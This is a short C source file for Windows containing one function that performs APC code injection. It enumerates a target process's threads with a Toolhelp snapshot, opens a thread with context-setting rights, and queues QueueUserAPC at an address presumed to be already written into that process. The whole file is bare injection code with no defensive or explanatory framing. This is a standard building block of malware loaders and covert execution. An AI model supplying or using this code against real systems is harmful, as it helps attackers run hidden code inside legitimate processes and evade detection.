#include <Windows.h>
#include <TlHelp32.h>

BOOL QueueAPCInject_x64(HANDLE hProc, PVOID remoteAddr) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (te32.th32OwnerProcessID == GetProcessId(hProc)) {
            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
            if (hThread != NULL) {
                if (QueueUserAPC((PAPCFUNC)remoteAddr, hThread, 0)) {
                    CloseHandle(hThread);
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    return FALSE;
}
